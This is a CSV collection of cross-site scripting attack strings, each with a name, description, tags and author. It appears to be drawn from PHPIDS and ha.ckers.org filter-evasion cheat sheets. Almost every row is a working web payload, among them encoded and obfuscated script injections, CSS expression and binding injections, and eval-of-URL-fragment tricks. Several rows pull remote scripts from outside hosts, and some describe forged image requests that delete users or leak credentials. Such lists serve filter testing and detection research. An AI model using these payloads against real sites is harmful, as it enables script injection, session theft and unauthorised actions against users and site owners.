"Exploit Name","Exploit Description","Exploit String","Exploit Tags","Author Name","Author URL"
"Advanced HTML injection locator","This vector indicates HTML injections by stroked text.","<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e","general, html breaking, injection",".mario",""
"Advanced XSS Locator","Advanced XSS Locator","';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//","general, html breaking, comment breaking, JS breaking",".mario",""
"Advanced XSS Locator for title-Injections","This is a modified version of the XSS Locator from ha.ckers.org especially crafted to check for title injections.","';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}","general, html breaking, comment breaking, JS breaking, title breaking",".mario",""
"HTML Quoute & Comment breaker","This vector breaks HTML quotes and comments.","'';!--""<script>alert(0);</script>=&{(alert(1))}","general, html breaking, comment breaking",".mario",""
"IE backticked semicolon injection","This vector utilized back ticks as attribute delimiters. This works only in IE.","<img src=`x` onrerror= ` ;; alert(1) ` />","general, injection, internet explorer",".mario",""
"IE closing-tag expression injection","This vector exploits a bug in IE whre attributes in closing comments are evaluated.","</a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">","general, injection, internet explorer",".mario",""
"IE expression injection","This vector utilizes the feature of CSS expressions in IE."," style=color: expression(alert(0));"" a=""","general, injection, internet explorer, style injection",".mario",""
"IE VB Messagebox injection","This injects VB code and produces a message box. IE only.","vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<","general, basic, internet explorer",".mario",""
"Image onerror wrapped in XML statement","This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.","a=<a>
<b>
%3c%69%6d%67%2f%73%72%63%3d%31
%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
</b>
</a>
document.write(unescape(a..b))","general, obfuscated, gecko, XML predicates, evil tags",".mario",""
"JS string concatenation breaker","This can be used when input is concatenated in JavaScript.","+alert(0)+","general, JS breaking, basic",".mario",""
"Mozilla -moz-binding-url injection","The vector incudes a binding file via injected style attrbute. Gecko only."," style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""","general, injection, gecko, style injection",".mario",""
"Multiline selfcontained XSS","This vector uses line breaks to obfuscate and evaluates the location hash.","_
=
eval
b=1
__
=
location
c=1
_
(
__
.
hash
//
.
substr
(1)
)","self contained, general, obfuscated",".mario",""
"Name contained XSS variant 2","This name contained XSS requires newlines to be able to work - and access to the window.name property.","a=/ev/// 

.source a+=/al/// 

.source a[a] (name)","general, name contained, obfuscated",".mario",""
"Plain JavaScript alert","This very basic exploit works on surprisingly many pages - no real danger but bad image.","alert(1)","general, basic, super short",".mario",""
"Super basic HTML breaker 2","This super basic vector breaks HTML attributes
",">""'","general, basic, super short, html breaking",".mario",""
"Super short XSS variant 1","This extremely short XSS vector works only when newlines can be injected.","a=alert

a(0)","general, super short",".mario",""
"URL breaker for double quotes","This vector breaks double quoted URL input","http://aa""><script>alert(123)</script>","URL breaking, general, basic, html breaking",".mario",""
"URL breaker for single quotes","This vector breaks single quoted URL input","http://aa'><script>alert(123)</script>","URL breaking, basic, general, html breaking",".mario",""
"with() executing alert via document.__parent__","This vector uses the __parent__ property combined with with() to execute an alert.","with(document.__parent__)alert(1)","general, super short, obfuscated, gecko, __property__",".mario",""
"__parent__ stored JS alert","This vector uses the __parent__ property to store the alert function and execute it afterwards with new label.","document.__parent__._=alert
_(1)","general, super short, obfuscated, gecko, __property__",".mario",""
"__proto__ stored JS alert","This vector uses the __proto__ property to store the alert function and execute it afterwards with new label.","top.__proto__._= alert
_(1)","general, super short, obfuscated, gecko, __property__",".mario",""
"Conditional style injection for IE","This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.","width: expression((window.r==document.cookie)?'':alert(r=document.cookie))","general, obfuscated, internet explorer, style injection","DoctorDan",""
"Add onclick event hadler","This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.","onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);","general, JS breaking, basic, obfuscated, user interaction","kishor",""
"Basic back ticked attribute breaker","This vector breaks back ticked attributes.","`> <script>alert(5)</script>","general, html breaking, basic","kishor",""
"Basic double quoted attribute breaker","This vector breaks double quoted attributes and produces an alert.","> <script>alert(4)</script>","general, html breaking","kishor",""
"Basic JS breaker","This vector just fits between script tags and fires an alerts.","xyz onerror=alert(6); ","general, JS breaking, basic","kishor",""
"Basic JS breaker variant 1","This vector breaks JS integer assignments.","1;a=eval;b=alert;a(b(/c/.source));","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 2","This vector breaks JS integer assignments in arrays.","1];a=eval;b=alert;a(b(17));//","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 3","This vector breaks JS when placed in double quoted arrays.","];a=eval;b=alert;a(b(16));//","general, JS breaking","kishor",""
"Basic JS breaker variant 4","This vector breaks JS when embedded in single quoted arrays.","'];a=eval;b=alert;a(b(15));//","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 5","JS literal object breaker for integer properties.","1};a=eval;b=alert;a(b(14));//","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 6","JS breaker for literal objects with single quoted string properties.","'};a=eval;b=alert;a(b(13));//","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 7","JS breaker for literal objects with double quoted string properties.","};a=eval;b=alert;a(b(12));//","general, JS breaking","kishor",""
"Basic JS breaker variant 8","Can be used when JS can be injected directly.","a=1;a=eval;b=alert;a(b(11));//","general, JS breaking, basic, obfuscated","kishor",""
"Basic JS breaker variant 9","Breaks double quoted strings, injects a comment, carriage return and finally an alert.",";//%0da=eval;b=alert;a(b(10));//","general, JS breaking, CRLF","kishor",""
"Basic JS breaker variant 10","Breaks single quoted strings, injects a comment, carriage return and finally an alert.","';//%0da=eval;b=alert;a(b(9));//","general, JS breaking, basic, obfuscated, CRLF","kishor",""
"Basic single quoted attribute breaker","This vector breaks single quoted attributes and appends an alert.","'> <script>alert(3)</script>","general, html breaking, basic","kishor",""
"Basic title breaker","This basic vector breaks HTML titles and injects JavaScript.","</title><script>alert(1)</script>","general, html breaking, basic, title breaking","kishor",""
"Comment-breaker using obfuscated JavaScript","This vector creates an alert by breaking multiline comments.","*/a=eval;b=alert;a(b(/e/.source));/*","general, comment breaking, JS breaking","kishor",""
"JavaScript-breaker using carriage return","This vector uses an urlencoded carriage return to break JS code and produce an alert afterwards.","%0da=eval;b=alert;a(b(/d/.source));","general, JS breaking, CRLF","kishor",""
"Markup breaker with special quotes","This markup breaking vector utilizes specially crafted quotes to break the existing markup. ","%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//","general, html breaking, JS breaking","kishor",""
"Noscript-breaker with mouseover","This vector breaks noscript areas and appends an element reacting on mouseover events.","</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>","general, html breaking, obfuscated, user interaction","kishor",""
"Style-breaker using obfuscated JavaScript","This vector ends styleblocks and uses obfuscated JavaScript to create an alert.","}</style><script>a=eval;b=alert;a(b(/i/.source));</script>","general, html breaking, CSS breaking","kishor",""
"Textarea-breaker with mouseover","This vector breaks textareas and creates an element reacting on mouveover events.","</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>","general, html breaking, obfuscated, user interaction","kishor",""
"URL-breaking vector","This vector is a basic URL breaker - embedding an alert in a URL-like wrapper.","http://aa<script>alert(123)</script>","general, URL breaking, basic","kishor",""
"Mozilla -moz-binding-url injection - filter evading","This vector was once used on a major site to evade a stripping filter and inject binding XML."," sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""","general, injection, gecko, style injection","PHPIDS Group",""
"Name contained XSS variant 1","This vector depends on attackers ability to access the window.name property where the payload is located.","b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name","general, name contained, obfuscated","PHPIDS Group",""
"Name contained XSS variant 3","New-lined requiring name contained vector - this time not comment obfuscated so easier to detect.","a=/ev/ 

.source a+=/al/ 

.source,a = a[a] a(name)","general, name contained","PHPIDS Group",""
"Name contained XSS variant 4","This vector utilizes the setTimeout function to fire - also it's name contained and comment-obfuscated and requires newlines.","setTimeout// 
(name// ,0)","general, name contained, obfuscated, timed","PHPIDS Group",""
"Obfuscated XSS variant 1","Shuffled and obfuscated function calls","___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)","general, obfuscated","PHPIDS Group",""
"Self-contained XSS variant 1","Concatenates obfuscated eval() and substr() to be called on location.hash","a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 2","Concatenates fragmented functions to evakuate the location hash","a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 3","Uses call() and eval() to access the payload in the fragment identifier","eval.call(this,unescape.call(this,location))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 4","This one is pretty hard to detect due to the total fragmentation. Fragments are built together to a self-executing function.","d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 5","This variant has the function fragments shuffled to evade concatenation filters and is thus very hard to detect.","l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a","general, self contained, shuffled","PHPIDS Group",""
"Self-contained XSS variant 6","Since Javascript allows \w+ as variable name - this vector uses _ to evade filters.","_=eval,__=unescape,___=document.URL,_(__(___))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 7","Uses special characters as variable names and self-executes the concatenated payload trigger.","$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 8","This time $ is used to obfuscate the self-executing payload trigger.","$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))","general, self contained","PHPIDS Group",""
"Self-contained XSS variant 9","This more than sophisticated vector is hard to explain - it' creator did here: http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13409","evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)","general, self contained, shuffled","PHPIDS Group",""
"XML predicate XSS using content[n]","This vector uses XML predicate properties to activate its payload.","y=<a>alert</a>;content[y](123)","general, XML predicates, gecko","PHPIDS Group",""
"BASE","Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like ”images/image.jpg” rather than full paths.  If the path includes a leading forward slash like ”/images/image.jpg” you can remove one slash from this vector (as long as there are two to begin the comment this will work","<BASE HREF=""javascript:alert('XSS');//"">","general, evil tags","ha.ckers.org",""
"BGSOUND","BGSOUND","<BGSOUND SRC=""javascript:alert('XSS');"">","general, evil tags","ha.ckers.org",""
"BODY background-image","BODY image","<BODY BACKGROUND=""javascript:alert('XSS');"">","general, evil tags","ha.ckers.org",""
"BODY ONLOAD","BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”<SCRIPT...” to accomplish the XSS attack)","<BODY ONLOAD=alert('XSS')>","general, evil tags","ha.ckers.org",""
"Case Insensitive","Case insensitive XSS attack vector.","<IMG SRC=JaVaScRiPt:alert('XSS')>","general, evil tags, obfuscated","ha.ckers.org",""
"Character Encoding Example","All of the possible combinations of the character ”<” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).","<%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C","general, evil tags, obfuscated","ha.ckers.org",""
"Commented-out Block","Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.","<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->","general, obfuscated, conditional comments, internet explorer","ha.ckers.org",""
"Content Replace","Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&#x26;#x09;script:” was converted into ”java&#x09;script:”.","<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"Cookie Manipulation","Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).","<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">","general, evil tags","ha.ckers.org",""
"DIV background-image 1","Div background-image","<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">","general, evil tags, style injection","ha.ckers.org",""
"DIV background-image 2","Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)","<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">","general, evil tags, style injection","ha.ckers.org",""
"DIV expression","Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”","<DIV STYLE=""width: expression(alert('XSS'));"">","general, evil tags, style injection,  internet explorer","ha.ckers.org",""
"DIV w/Unicode","DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.","<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">","general, evil tags, obfuscated","ha.ckers.org",""
"Double open angle brackets","This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't","<IFRAME SRC=http://ha.ckers.org/scriptlet.html <","general, evil tags, injection, gecko","ha.ckers.org",""
"Dword Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).","<A HREF=""http://1113982867/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"Embed Flash","Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :","<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Embedded Carriage Return","Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).","<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">","general, evil tags, obfuscated","ha.ckers.org",""
"Embedded Encoded Tab","Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.","<IMG SRC=""jav&#x09;ascript:alert('XSS');"">","general, evil tags, obfuscated","ha.ckers.org",""
"Embedded Newline","Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.","<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"Embedded Tab","Embedded tab to break up the cross site scripting attack.","<IMG SRC=""javascript:alert('XSS');"">","general, evil tags, internet explorer","ha.ckers.org",""
"End title tag","This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.","</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>","general, title breaking","ha.ckers.org",""
"Escaping JavaScript escapes","Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=”$ENV{QUERY_STRING}”;</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a=””;alert('XSS');//”;</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.","\"";alert('XSS');//","general, JS breaking","ha.ckers.org",""
"Evade Regex Filter 1","For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of the following regex filter: /<script[^>]+src/i","<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Evade Regex Filter 2","For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of a regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i this is an important one, because I've seen this regex in the wild)","<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Evade Regex Filter 3","Another XSS to evade this regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i","<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Evade Regex Filter 4","Yet another XSS to evade the same filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i    
The only thing I've seen work against this XSS attack if you still want to allow <SCRIPT> tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags)","<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Evade Regex Filter 5","And one last XSS attack (using grave accents) to evade this regex: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i","<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Extra dot for Absolute DNS","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).","<A HREF=""http://www.google.com./"">XSS</A>","general, evil tags","ha.ckers.org",""
"Extraneous Open Brackets","(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.","<<SCRIPT>alert(""XSS"");//<</SCRIPT>","general, obfuscated","ha.ckers.org",""
"Filter Evasion 1","This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.","<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Filter Evasion 2","Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.","<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","general, evil tags, obfuscated, injection","ha.ckers.org",""
"Firefox Lookups 1","Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”","<A HREF=""//google"">XSS</A>","general, evil tags, gecko","ha.ckers.org",""
"Firefox Lookups 2","This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the ”feeling lucky” function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.","<A HREF=""http://ha.ckers.org@google"">XSS</A>","general, evil tags, obfuscated, gecko","ha.ckers.org",""
"Firefox Lookups 3","This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the ”feeling lucky” function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case ”google”).","<A HREF=""http://google:ha.ckers.org"">XSS</A>","general, evil tags, obfuscated, gecko","ha.ckers.org",""
"FRAME","Frame (Frames have the same sorts of XSS problems as iframes).","<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>","general, evil tags, style injection, internet explorer","ha.ckers.org",""
"Grave Accents","Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).","<IMG SRC=`javascript:alert(""RSnake says### 'XSS'"")`>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"Half-Open HTML/JavaScript","Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
	/((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ 
As a side note, this was also effective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag.","<IMG SRC=""javascript:alert('XSS')""","general, evil tags, internet explorer","ha.ckers.org",""
"Hex Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).
The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.","<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"Hex Encoding w/out Semicolons","Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).","<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"HTML Entities","HTML entities (the semicolons are required for this to work).","<IMG SRC=javascript:alert(&quot;XSS&quot;)>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"IFRAME","Iframe (If iframes are allowed there are a lot of other XSS problems as well).","<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","general, evil tags, internet explorer","ha.ckers.org",""
"Image w/CharCode","If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.","<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"IMG Dynsrc","IMG Dynsrc","<IMG DYNSRC=""javascript:alert('XSS');"">","general, evil tags, internet explorer","ha.ckers.org",""
"IMG Embedded commands 1","This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.","<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">","general, evil tags","ha.ckers.org",""
"IMG Embedded commands 2","IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=”http://badguy.com/a.jpg”> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).","Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser","general, redirect","ha.ckers.org",""
"IMG Lowsrc","IMG Lowsrc","<IMG LOWSRC=""javascript:alert('XSS');"">","general, evil tags, internet explorer","ha.ckers.org",""
"IMG No Quotes/Semicolon","No quotes and no semicolon","<IMG SRC=javascript:alert('XSS')>","general, evil tags, internet explorer","ha.ckers.org",""
"IMG STYLE w/expression","IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).","exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>","general, evil tags, internet explorer","ha.ckers.org",""
"IMG w/JavaScript Directive","Image XSS using the JavaScript directive.","<IMG SRC=""javascript:alert('XSS');"">","general, evil tags, internet explorer","ha.ckers.org",""
"IMG w/VBscript","VBscript in an image","<IMG SRC='vbscript:msgbox(""XSS"")'>","general, evil tags, internet explorer","ha.ckers.org",""
"INPUT Image","INPUT Image","<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">","general, evil tags, internet explorer","ha.ckers.org",""
"IP Encoding","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).","<A HREF=""http://66.102.7.147/"">XSS</A>","general, evil tags, obfuscated","ha.ckers.org",""
"JavaScript Includes","&JavaScript includes (works in Netscape 4.x).","<BR SIZE=""&{alert('XSS')}"">","general, evil tags, obfuscated","ha.ckers.org",""
"JavaScript Link Location","URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed)
JavaScript link location","<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>","general, evil tags, obfuscated, redirect","ha.ckers.org",""
"LAYER","Layer (Older Netscape only)","<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>","general, evil tags","ha.ckers.org",""
"List-style-image","Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.","<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS","general, evil tags, internet explorer","ha.ckers.org",""
"Livescript","Livescript (Older Netscape only)","<IMG SRC=""livescript:[code]"">","general, evil tags","ha.ckers.org",""
"Local .htc file","This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.","<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">","general, evil tags, internet explorer, injection","ha.ckers.org",""
"Long UTF-8 Unicode w/out Semicolons","Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).","<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>","general, evil tags, obfuscated, internet explorer","ha.ckers.org",""
"Malformed IMG Tags","Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.","<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">","general, evil tags, obfuscated","ha.ckers.org",""
